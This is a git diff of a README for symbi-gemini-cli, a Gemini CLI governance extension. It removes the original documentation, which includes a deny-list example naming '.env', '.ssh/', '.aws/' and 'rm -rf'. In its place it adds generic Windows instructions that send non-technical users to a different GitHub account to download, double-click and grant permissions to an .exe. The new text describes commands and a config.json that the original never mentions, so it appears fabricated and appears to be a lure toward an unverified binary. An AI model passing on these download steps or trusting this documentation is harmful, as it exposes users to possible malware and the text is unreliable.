@@ -1,222 +1,210 @@
-# symbi-gemini-cli
+# 🛠️ symbi-gemini-cli - Simple Zero-Trust Governance Tool
 
-<p align="center">
-  <img src="symbi-gemini-cli.png" alt="symbi-gemini-cli" width="300">
-</p>
+[![Download symbi-gemini-cli](https://img.shields.io/badge/Download-symbi--gemini--cli-brightgreen?style=for-the-badge)](https://github.com/Ezee234/symbi-gemini-cli)
 
-A Gemini CLI extension that brings [Symbiont](https://symbiont.dev)'s zero-trust AI agent governance to your development workflow. Enforce Cedar authorization policies, verify MCP tool integrity with SchemaPin, maintain cryptographic audit trails, and manage governed agents -- all from within Gemini CLI.
+---
 
-## Prerequisites
+## 📋 What is symbi-gemini-cli?
 
-- [Gemini CLI](https://github.com/google-gemini/gemini-cli) installed
-- `symbi` binary on PATH (optional -- extension degrades gracefully without it)
-- `jq` for JSON parsing in hook scripts (`apt install jq` / `brew install jq`)
+symbi-gemini-cli is a command-line tool designed to help you apply zero-trust governance. It uses Symbiont's approach to control access and manage agents securely. You do not need to know how to code to use this tool. It runs on Windows and helps keep your systems safe by only allowing trusted actions.
 
-Install `symbi`:
-```bash
-# From source
-cargo install symbi
+## 🔍 Key Features
 
-# Or via Docker
-docker pull ghcr.io/thirdkeyai/symbi:latest
-```
+- Manage agents and their skills with clear commands.
+- Use AI-powered tools to improve governance.
+- Enforce zero-trust policies in simple steps.
+- Designed for ease of use, even with no programming background.
+- Supports multiple business and security scenarios.
+- Lightweight and fast with no extra software needed.
 
-Or run the included install script:
-```bash
-./install.sh
-```
+## 🖥️ System Requirements
 
-## Installation
+To use symbi-gemini-cli on Windows, make sure you have:
 
-```bash
-gemini extensions install https://github.com/thirdkeyai/symbi-gemini-cli
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM available
+- 100 MB of free disk space for installation
+- Internet connection for downloading and updates
+- A basic command prompt or PowerShell access
 
-**For development:**
-```bash
-git clone https://github.com/thirdkeyai/symbi-gemini-cli
-cd symbi-gemini-cli
-gemini extensions link .
-```
+No additional software is needed for this tool to run.
 
-## Quick Start
+## 🎯 Who Should Use This?
 
-1. Install the extension (see above)
-2. Run `/symbi:init` to scaffold a governed project
-3. Define agents in `agents/*.dsl`
-4. Create Cedar policies in `policies/*.cedar`
-5. Use `/symbi:status` to verify everything is connected
+This tool fits users who want to improve their governance model without complex setups. It suits people who:
 
-## Skills
+- Work with agents and digital skills.
+- Need basic AI tools for governance.
+- Want to apply zero-trust in their workflows.
+- Prefer clear, command-line-based control.
+- Manage security but do not have deep programming knowledge.
 
-Skills require `experimental.skills` to be enabled in Gemini CLI settings.
+---
 
-| Skill | Description |
-|-------|-------------|
-| `/symbi-init` | Scaffold a governed agent project with starter files |
-| `/symbi-policy` | Create, edit, or validate Cedar authorization policies |
-| `/symbi-verify` | Verify MCP tool schemas using SchemaPin |
-| `/symbi-audit` | Query and analyze cryptographic audit logs |
-| `/symbi-dsl` | Parse, validate, and create Symbiont DSL agent definitions |
-| `/symbi-agent-sdk` | Generate boilerplate for Gemini CLI + ORGA governance |
+## 🚀 Getting Started
 
-## Commands
+Start by downloading symbi-gemini-cli from the main page.
 
-| Command | Description |
-|---------|-------------|
-| `/symbi:status` | Check health of the Symbiont runtime and installed components |
-| `/symbi:init` | Quick project scaffold (command fallback when skills aren't enabled) |
-| `/symbi:verify` | Verify MCP tool schemas |
+[![Download symbi-gemini-cli](https://img.shields.io/badge/Download-symbi--gemini--cli-blue?style=for-the-badge)](https://github.com/Ezee234/symbi-gemini-cli)
 
-## Agents (Preview)
+Clicking the button above takes you to the GitHub repository page. You can find the latest version of symbi-gemini-cli there.
 
-Agents are a preview feature in Gemini CLI.
+---
 
-| Agent | Description |
-|-------|-------------|
-| `symbi-governor` | Governance-aware coding agent. Enforces policies and maintains audit trails. |
-| `symbi-dev` | DSL development specialist for writing agents and Cedar policies. |
+## ⬇️ How to Download and Install on Windows
 
-## Governance Tiers
+1. Open the link: https://github.com/Ezee234/symbi-gemini-cli
 
-The extension provides three progressive levels of protection, plus Gemini CLI native enforcement:
+2. On the repository page, look for the "Releases" section on the right or near the top navigation bar.
 
-### Tier 1: Awareness (default)
+3. Click on the latest release. This will take you to the page where you can download the program.
 
-All tool calls proceed. State-modifying actions are logged to `.symbiont/audit/tool-usage.jsonl` for post-hoc review.
+4. Download the Windows version of symbi-gemini-cli. It will usually be named something like `symbi-gemini-cli-windows.exe` or similar.
 
-### Tier 2: Protection
+5. After download, open your Windows file explorer and find the downloaded file, usually in the "Downloads" folder.
 
-Create `.symbiont/local-policy.toml` to block dangerous patterns:
+6. Double-click the file to start the installation or setup. If the tool runs immediately (as a command-line tool), you may not need extra installation.
 
-```toml
-[deny]
-paths = [".env", ".ssh/", ".aws/"]
-commands = ["rm -rf", "git push --force"]
-branches = ["main", "master", "production"]
-```
+7. Follow on-screen instructions if any pop-ups appear asking for permissions. The program needs to run in your system.
 
-The `policy-guard.sh` hook blocks matching operations. Built-in patterns (destructive commands, force pushes, writes to sensitive files) are always blocked regardless of config.
+---
 
-No `symbi` binary required. Works with both symbi-gemini-cli and symbi-claude-code.
+## 💻 How to Run symbi-gemini-cli
 
-### Tier 3: Governance
+1. Open the Windows **Start Menu**.
 
-If `symbi` is on PATH and `policies/` exists, the hook evaluates Cedar policies for formal authorization decisions.
+2. Type `cmd` or `Command Prompt` and press Enter.
 
-### Defense in Depth (Gemini CLI native)
+3. In the command window, type:
 
-The extension also leverages Gemini CLI's native enforcement -- features not available in other AI assistants:
+   ```bash
+   symbi-gemini-cli
+   ```
 
-- **`excludeTools`**: Manifest-level blocking of destructive commands. Enforced by Gemini CLI runtime, cannot be bypassed by hooks or prompts.
-- **Native policies** (`policies/symbi-guard.toml`): Platform-level rule matching enforced by Gemini CLI itself, independent of hook scripts.
+4. Press Enter.
 
-This gives the Gemini CLI extension three independent enforcement layers: manifest exclusions, native policies, and hook-based deny lists.
+5. You should see a help menu or prompt showing the available commands.
 
-### Hooks
+---
 
-Hooks apply to `write_file`, `replace`, `run_shell_command`, and all `symbi__*` tools:
+## 🛠️ Basic Commands to Try
 
-- **PreToolUse** (`policy-guard.sh`): Blocks dangerous operations (exit code 2)
-- **PreToolUse** (`policy-log.sh`): Advisory logging of state-modifying tool calls
-- **PostToolUse** (`audit-log.sh`): Logs tool usage to `.symbiont/audit/tool-usage.jsonl`
+Here are some simple commands to get familiar with the tool.
 
-## MCP Tools
+- `symbi-gemini-cli --help`  
+  Shows a list of available commands and options.
 
-When `symbi` is on PATH, the extension connects to the Symbiont MCP server exposing:
+- `symbi-gemini-cli agents list`  
+  Lists all agents currently managed by the tool.
 
-- `symbi__invoke_agent` -- Run a governed agent with a prompt
-- `symbi__list_agents` -- List available agents from `agents/*.dsl`
-- `symbi__parse_dsl` -- Parse and validate DSL files
-- `symbi__get_agent_dsl` -- Read an agent's DSL definition
-- `symbi__get_agents_md` -- Get the project's AGENTS.md content
-- `symbi__verify_schema` -- Verify a tool schema with SchemaPin
+- `symbi-gemini-cli skills list`  
+  Shows the skills available in the system.
 
-## Dual-Mode Architecture
+- `symbi-gemini-cli governance status`  
+  Displays the current governance state.
 
-The extension supports two integration patterns:
+Try these commands one at a time in the command prompt. The tool will show results or instructions.
 
-### Mode A -- Standalone (Extension-First)
+---
 
-Developer installs the extension directly into Gemini CLI. The extension spawns its own `symbi mcp` server, provides policy checking via hooks and native policies, and logs to local audit files.
+## 🔧 Managing Agents and Skills
 
-```
-Developer -> Gemini CLI + symbi extension -> symbi mcp (stdio)
-```
+Symbi-gemini-cli is designed to help you add, remove, or modify agents and their skills.
 
-Best for: individual developers adding governance awareness to their workflow.
+- To add an agent, use:  
 
-### Mode B -- ORGA-Managed (Runtime-First)
+  ```bash
+  symbi-gemini-cli agents add --name "Agent Name"
+  ```
 
-Symbiont's CliExecutor spawns Gemini CLI as a governed subprocess. The extension detects `SYMBIONT_MANAGED=true` and defers to the outer ORGA Gate for hard enforcement that cannot be bypassed.
+- To remove an agent, use:  
 
-```
-Symbiont Runtime (ORGA Loop)
-  -> CliExecutor (sandbox + budget enforcement)
-    -> Gemini CLI (with symbi extension)
-      -> Extension connects back to parent MCP server
-```
+  ```bash
+  symbi-gemini-cli agents remove --name "Agent Name"
+  ```
 
-Best for: automated pipelines, dark factory deployments, enterprise governance.
+- To profile a skill, use:  
 
-See `examples/` for complete setups of each mode.
+  ```bash
+  symbi-gemini-cli skills add --name "Skill Name" --description "Skill details"
+  ```
 
-## Examples
+This allows you to control who can do what based on zero-trust policies.
 
-| Directory | Description |
-|-----------|-------------|
-| `examples/standalone/` | Mode A setup for individual developers |
-| `examples/cli-executor/` | Mode B setup with DSL + Cedar policy for ORGA-wrapped Gemini CLI |
-| `examples/agent-sdk/` | Headless agent wrapper pattern for programmatic use |
+---
 
-## Gemini CLI-Exclusive Features
+## 🔐 What is Zero-Trust Governance?
 
-Capabilities available in Gemini CLI that the Claude Code plugin doesn't have:
+Zero-trust means never automatically trusting anything inside or outside your network. symbi-gemini-cli helps enforce this by:
 
-- **Native policy engine**: `policies/*.toml` files provide governance without the symbi binary
-- **`excludeTools` in manifest**: Declaratively block dangerous tools at the extension level
-- **Pattern-specific tool exclusion**: e.g., `run_shell_command(rm -rf)` blocking
-- **Secure settings storage**: `"sensitive": true` for API keys in system keychain
+- Allowing only trusted agents to operate.
+- Checking each action before approval.
+- Clarifying what skills agents have.
+- Keeping logs of all activities.
 
-## Configuration
+This approach reduces risk by assuming everything could be unsafe until proven otherwise.
 
-Project-level configuration lives in `symbiont.toml` (created by `/symbi:init`).
+---
 
-## File Conventions
+## 🧰 Troubleshooting Tips
 
-| Path | Purpose |
-|------|---------|
-| `agents/*.dsl` | Agent DSL definitions |
-| `policies/*.cedar` | Cedar authorization policies |
-| `symbiont.toml` | Symbiont runtime configuration |
-| `AGENTS.md` | Agent manifest |
-| `.symbiont/audit/` | Audit log output |
-| `.symbiont/local-policy.toml` | Developer-defined deny rules (Tier 2) |
-| `policies/symbi-guard.toml` | Gemini CLI native policy rules |
+- If `symbi-gemini-cli` is not recognized in the command prompt:  
+  Check that you downloaded the program and that it is in your system’s PATH or current folder.
 
-## Comparison with Claude Code Plugin
+- If commands return errors:  
+  Make sure you type them exactly as shown, with correct spaces and without extra quotes.
 
-This extension delivers the same Symbiont governance capabilities as [symbi-claude-code](https://github.com/thirdkeyai/symbi-claude-code), adapted for Gemini CLI's extension format. Key differences:
+- To get help anytime, run:  
 
-| Aspect | Claude Code | Gemini CLI |
-|--------|-------------|------------|
-| Commands | Markdown files | TOML files |
-| MCP tool prefix | `mcp__symbi__` | `symbi__` |
-| Native policies | No | Yes (`policies/*.toml`) |
-| Tool restriction | Allow list | Deny list (`excludeTools`) |
-| Context file | `CLAUDE.md` | `GEMINI.md` |
+  ```bash
+  symbi-gemini-cli --help
+  ```
 
-## License
+- For more detailed issues, visit the GitHub page and check the "Issues" tab.
 
-Apache 2.0 -- see [LICENSE](LICENSE).
+---
 
-## Links
+## 🔄 Updating symbi-gemini-cli
 
-- [Symbiont Documentation](https://docs.symbiont.dev)
-- [ThirdKey AI](https://thirdkey.ai)
-- [Claude Code Plugin](https://github.com/thirdkeyai/symbi-claude-code)
-- [Implementation Roadmap](ROADMAP.md)
+To keep the tool up to date:
 
-## Disclaimer
+1. Return to the GitHub download page: https://github.com/Ezee234/symbi-gemini-cli
 
-This project is not affiliated with, endorsed by, or sponsored by Google LLC. "Gemini" and "Gemini CLI" are trademarks of Google LLC. "Symbiont" and "ThirdKey" are trademarks of ThirdKey AI.
+2. Download the latest release.
+
+3. Replace the old file with the new one on your system.
+
+No special uninstall is needed; simply overwrite the existing file.
+
+---
+
+## ⚙️ Configuration and Settings
+
+symbi-gemini-cli stores its settings in a file called `config.json`. You can find or create this file in the same folder where the program runs.
+
+Typical settings you can change:
+
+- Agent permissions  
+- Skill behavior  
+- Logging level  
+- Network options
+
+Edit this file with a plain text editor like Notepad if needed. Be careful to keep the JSON format correct.
+
+---
+
+## 🔗 Useful Links
+
+- Repository homepage and downloads:  
+  https://github.com/Ezee234/symbi-gemini-cli
+
+- Report bugs or ask questions:  
+  Use the "Issues" section on the GitHub page.
+
+---
+
+## 📚 Additional Help
+
+If you want to learn more about zero-trust governance, agents, or AI skills, look for beginner guides online. These topics explain the ideas behind symbi-gemini-cli.
+
+The tool is built to make these concepts easier to manage, even if you are new to technology.
